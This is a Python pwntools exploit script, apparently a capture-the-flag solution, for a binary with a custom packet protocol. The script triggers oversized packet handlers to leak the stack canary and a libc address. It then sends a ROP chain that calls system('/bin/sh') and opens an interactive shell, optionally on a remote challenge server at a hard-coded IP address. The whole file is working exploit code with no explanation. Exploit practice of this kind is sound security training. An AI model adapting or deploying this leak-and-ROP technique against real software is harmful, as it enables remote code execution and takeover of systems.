#!/usr/bin/env python3

from pwn import *
from pack import *
import socket
context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('main_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
ld = ELF('ld-2.35.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*main+148
        # b*unpack+79
        # b*main+790
        b*0x4025AA 
        b*0x0402692   
        b*0x040268B 
        c
        ''')
        sleep(1)

#  nc 67.223.119.69 3637 
# if args.REMOTE:
#     p = remote('67.223.119.69', 3637)
#     # p = remote('0', 1338)
# else:
#     p = process([exe.path])
NUMBER = 0
KEY    = 1
BIN    = 2
SIGNAL = 3

def choice_0x1337(num, data):
    load  = [
    {
        'type': NUMBER,
        'value': num
    },
    {
        'type':  BIN,
        'data': data
    }
    ]
    packet = create_packet(0x1337, pack_data(load))
    sa(b'> ' ,create_packet(0x100, b'\0') )

    s(packet)
    info(f'len: {hex(len(packet))}')

def choice_0xdead(data):
    load  = [
    {
        'type': BIN,
        'data': data
    }
    ]
    packet = create_packet(0xdead, pack_data(load))
    sa(b'> ' ,create_packet(0x100, b'\0') )

    sa(b'> ', packet)

    info(f'len: {hex(len(packet))}')

def show():
    packet = create_packet(0x700, p8(0))
    sa(b'> ' ,create_packet(0x100, b'\0') )

    sa(b'> ', packet)



# choice_0x1337(0xfffff, b'a'*(0xee0))
# show()


# GDB()
def flag():
    
    """
    canary: 0x3009
    """
   
    choice_0x1337(0x29, b'\0')
    
    choice_0x1337(0xffff,  b'w'*(0x2fe0))

    choice_0xdead(b'f'*0x29)


    show()

    info(f'start leak canary')

    a = p.recvuntil(b'No data available !', drop=True)
    info(f'---------------------------------------------------------')
    print(a)
    canary = u64(a[len(a)-10:len(a)-3] + b'\0') << 8
    info(f'canary: {hex(canary)}')

    
    choice_0x1337(0x38, b'\0')

    choice_0x1337(0xfffff, b'w'*(0x2fe0))

    choice_0xdead(b'f'*0x38)

    show()

    info(f'-'*0x10)
    info(f'leak libc')
    a = p.recvuntil(b'No data available !', drop=True)
    info(f'---------------------------------------------------------')
    print(a)
    libc_leak = u64(a[len(a)-8:len(a)-2] + b'\0\0')
    libc.address = libc_leak - 0x29d90
    info(f'libc leak: {hex(libc_leak)}')
    info(f'libc base: {hex(libc.address)}')

  
    choice_0x1337(0x100, b'\0')

    choice_0x1337(0xfffff, b'h'*(0x2fe0))

    pop_rdi  =0x000000000002a3e5 + libc.address
    win = flat(
        b'a'*0x28,
        canary,
        1,
        pop_rdi+1,
        pop_rdi,
        next(libc.search(b'/bin/sh')),
        libc.sym.system
    )

    # GDB()
    choice_0xdead(win)


if args.REMOTE:
    p = remote('67.223.119.69', 3637)
    # p = remote('0', 1338)
    p.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

else:
    p = process([exe.path])

flag()
sa(b'> ', b'w')
  
p.interactive()
